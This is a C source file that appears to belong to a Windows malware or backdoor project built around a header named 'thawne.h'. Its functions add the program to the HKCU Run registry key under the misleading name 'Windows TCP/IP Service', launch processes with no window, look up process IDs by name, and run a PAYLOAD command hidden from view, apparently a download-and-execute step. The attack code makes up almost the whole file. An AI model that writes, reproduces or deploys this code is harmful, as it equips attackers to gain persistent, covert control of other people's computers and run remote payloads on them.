/*



Have a good time reading the source. You are an amazing person.


 
*/
#include "thawne.h"


void AddToStartup()
{
    HKEY hKey;
    TCHAR DIR[MAX_PATH];
    const char* czStartName = "Windows TCP/IP Service";
    char* czExePath = malloc(MAX_PATH + 1);

    int fpath = GetModuleFileName(NULL, DIR, MAX_PATH);
	if (fpath != 0)
	{
        memset(czExePath, '\0', MAX_PATH);
        snprintf(czExePath, MAX_PATH, "%s", DIR);
    }

    LONG lnRes = RegOpenKeyEx(  HKEY_CURRENT_USER,
                                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                                0 , KEY_WRITE,
                                &hKey);
    if( ERROR_SUCCESS == lnRes )
    {
        lnRes = RegSetValueEx(  hKey,
                                czStartName,
                                0,
                                REG_SZ,
                                (unsigned char*)czExePath,
                                strlen(czExePath) );
    }

    RegCloseKey(hKey);
}

void StartProcess(char* filename)
{
	PROCESS_INFORMATION pinfo; 
	STARTUPINFO sinfo; 
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	if(CreateProcess((LPCSTR)filename, NULL, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)){
        WaitForSingleObject(pinfo.hProcess, 5000);
		CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);
	}
}


BOOL isFile(char* file)
{
   DWORD dwAttrib = GetFileAttributes(file);

   return (dwAttrib != INVALID_FILE_ATTRIBUTES && 
         !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

DWORD ProcessId(LPCTSTR ProcessName)
{
    PROCESSENTRY32 pt;
    HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pt.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hsnap, &pt)) { 
        do {
            if (!lstrcmpi(pt.szExeFile, ProcessName)) {
                CloseHandle(hsnap);
                return pt.th32ProcessID;
            }
        } while (Process32Next(hsnap, &pt));
    }
    CloseHandle(hsnap); 
    return 0;
}

void DownloadExecute()
{
	PROCESS_INFORMATION pinfo; 
	STARTUPINFO sinfo; 
	char buf[500];
	memset(buf, '\0', 500);
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	snprintf(buf, 500, PAYLOAD);
	if(CreateProcess(NULL, buf, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)){
        WaitForSingleObject(pinfo.hProcess, INFINITE);
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);
	} 
}